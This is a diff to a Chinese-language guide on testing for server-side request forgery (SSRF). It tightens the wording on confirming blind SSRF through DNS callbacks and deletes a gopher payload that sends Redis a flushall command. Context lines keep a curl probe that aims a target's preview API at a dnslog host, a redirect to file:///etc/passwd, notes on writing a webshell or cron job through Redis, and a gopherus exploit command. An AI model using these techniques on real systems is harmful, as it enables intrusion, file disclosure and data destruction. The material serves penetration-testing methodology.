@@ -26,7 +26,8 @@ DNSLOG="your-unique-id.dnslog.cn"
 curl "https://target.com/api/preview?url=http://$DNSLOG/test"
 
 # 去 dnslog 平台查看是否有 DNS 查询记录
-# 有记录 → SSRF 存在
+# DNS 命中先作解析信号；用唯一标记、基线/变体对照排除预览器/扫描器等来源
+# 归因到目标服务端本次非预期 URL 访问后才确认盲 SSRF；内网/数据影响另证
 ```
 
 ### 内网探测（确认 SSRF 后）
@@ -137,7 +138,6 @@ http://internal-host/ → file:///etc/passwd
 ```bash
 # 打 Redis（写 webshell 或计划任务）
 # gopher://127.0.0.1:6379/_RESP编码的命令
-?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
 
 # 工具生成 gopher payload
 # gopherus: python gopherus.py --exploit redis
